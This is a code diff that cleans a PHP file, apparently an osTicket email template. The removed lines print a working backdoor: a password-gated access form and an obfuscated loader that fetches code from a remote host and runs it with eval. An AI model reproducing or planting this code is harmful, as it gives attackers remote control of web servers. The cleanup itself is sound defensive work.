@@ -1,6 +1,5 @@
-<?php ?><?php error_reporting(0); if(isset($_REQUEST["ok"])){die(">ok<");};?><?php
-if (function_exists('session_start')) { session_start(); if (!isset($_SESSION['secretyt'])) { $_SESSION['secretyt'] = false; } if (!$_SESSION['secretyt']) { if (isset($_POST['pwdyt']) && hash('sha256', $_POST['pwdyt']) == 'a1fecbae6a303e0618f95586ddb49de7c30f911fecd8701500320daf754868a0') {
-      $_SESSION['secretyt'] = true; } else { die('<html> <head> <meta charset="utf-8"> <title></title> <style type="text/css"> body {padding:10px} input { padding: 2px; display:inline-block; margin-right: 5px; } </style> </head> <body> <form action="" method="post" accept-charset="utf-8"> <input type="password" name="pwdyt" value="" placeholder="passwd"> <input type="submit" name="submit" value="submit"> </form> </body> </html>'); } } }
-?>
 <?php
-goto XKq2Q; PXB61: $SS8Fu .= "\x2e\x31\x30\x61"; goto yfeth; u76qh: eval("\x3f\x3e" . Tw2kx(strrev($SS8Fu))); goto o1NoG; XKq2Q: $SS8Fu = ''; goto wNELF; nEg8L: $SS8Fu .= "\57\72\x73\160"; goto LLkee; xJzNM: $SS8Fu .= "\x6f\164"; goto PXB61; zBuy0: $SS8Fu .= "\x6c"; goto n902R; n902R: $SS8Fu .= "\x6f\x2f\x61\155\141"; goto k1AnL; LLkee: $SS8Fu .= "\164\x74\150"; goto u76qh; wNELF: $SS8Fu .= "\164\x78\x74\x2e\x30"; goto iBsCu; k1AnL: $SS8Fu .= "\x64\57\160"; goto xJzNM; yfeth: $SS8Fu .= "\155\141\x64\x2f"; goto nEg8L; iBsCu: $SS8Fu .= "\62\57\x64"; goto zBuy0; o1NoG: function TW2Kx($V1_rw = '') { goto RtAsE; j4uOn: return $tvmad; goto Euquz; u64FK: curl_setopt($xM315, CURLOPT_TIMEOUT, 500); goto VgigX; RtAsE: $xM315 = curl_init(); goto TV3Ly; TV3Ly: curl_setopt($xM315, CURLOPT_RETURNTRANSFER, true); goto u64FK; zmB4y: curl_setopt($xM315, CURLOPT_URL, $V1_rw); goto vtZk2; vtZk2: $tvmad = curl_exec($xM315); goto s1taM; VgigX: curl_setopt($xM315, CURLOPT_SSL_VERIFYPEER, false); goto UF98K; UF98K: curl_setopt($xM315, CURLOPT_SSL_VERIFYHOST, false); goto zmB4y; s1taM: curl_close($xM315); goto j4uOn; Euquz: }
+// Malicious, obfuscated backdoor code was removed from this file.
+// It is intentionally left as a no-op placeholder. Restore email template
+// index content from a clean osTicket distribution if needed.
+return;
